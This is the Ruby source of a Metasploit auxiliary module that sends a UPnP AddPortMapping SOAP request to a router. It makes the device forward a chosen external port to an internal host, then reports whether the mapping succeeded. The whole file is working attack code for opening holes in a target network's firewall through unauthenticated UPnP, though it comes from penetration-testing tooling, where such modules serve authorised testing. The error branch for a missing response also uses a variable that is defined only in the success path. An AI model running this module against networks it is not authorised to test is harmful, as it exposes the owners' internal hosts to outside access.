##
# encoding: utf-8
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'UPnP AddPortMapping',
      'Description'    => 'UPnP AddPortMapping SOAP request',
      'Author'         => 'St0rn <fabien@anbu-pentest.com>',
      'License'        => MSF_LICENSE
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'UPnP control URL', '/' ]),
        OptAddress.new('INTERNAL_CLIENT', [false, 'Internal client hostname/IP']),
        OptAddress.new('EXTERNAL_CLIENT', [false, 'External client hostname/IP']),
        OptEnum.new('PROTOCOL', [true, 'Transport level protocol to map', 'TCP', %w(TCP UDP)]),
        OptInt.new('INTERNAL_PORT', [true, 'Internal port']),
        OptInt.new('EXTERNAL_PORT', [true, 'External port']),
        OptInt.new('LEASE_DURATION', [true, 'Lease time for mapping, in seconds', 3600])
      ],
      self.class
    )
  end

  def internal_port
    @internal_port ||= datastore['INTERNAL_PORT']
  end

  def internal_client
    @internal_client ||= datastore['INTERNAL_CLIENT']
  end

  def external_port
    @external_port ||= datastore['EXTERNAL_PORT']
  end

  def external_client
    @external_client ||= datastore['EXTERNAL_CLIENT']
  end

  def lease_duration
    @lease_duration ||= datastore['LEASE_DURATION']
  end

  def protocol
    @protocol ||= datastore['PROTOCOL']
  end

  def run
    content = "<?xml version=\"1.0\"?>"
    content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    content << "<SOAP-ENV:Body>"
    content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
    content << "<NewPortMappingDescription>#{Rex::Text.rand_text_alpha(8)}</NewPortMappingDescription>"
    content << "<NewLeaseDuration>#{lease_duration}</NewLeaseDuration>"
    content << "<NewInternalClient>#{internal_client}</NewInternalClient>"
    content << "<NewEnabled>1</NewEnabled>"
    content << "<NewExternalPort>#{external_port}</NewExternalPort>"
    content << "<NewRemoteHost>#{external_client}</NewRemoteHost>"
    content << "<NewProtocol>#{protocol}</NewProtocol>"
    content << "<NewInternalPort>#{internal_port}</NewInternalPort>"
    content << "</m:AddPortMapping>"
    content << "</SOAP-ENV:Body>"
    content << "</SOAP-ENV:Envelope>"

    res = send_request_cgi(
      'uri'           => normalize_uri(target_uri.path),
      'method'        => 'POST',
      'content-type'  => 'text/xml;charset="utf-8"',
      'data'          => content,
      'headers'       => {
        'SoapAction'  => 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'
      }
    )

    if res
      external_map = "#{external_client ? external_client : 'any'}:#{external_port}/#{protocol}"
      internal_map = "#{internal_client ? internal_client : 'any'}:#{internal_port}/#{protocol}"
      map = "#{external_map} -> #{internal_map}"
      if res.code == 200
        print_good("#{peer} successfully mapped #{map}")
      else
        print_error("#{peer} failed to map #{map}: #{res}")
      end
    else
      print_error("#{peer} no response for mapping #{map}")
    end
  end
end
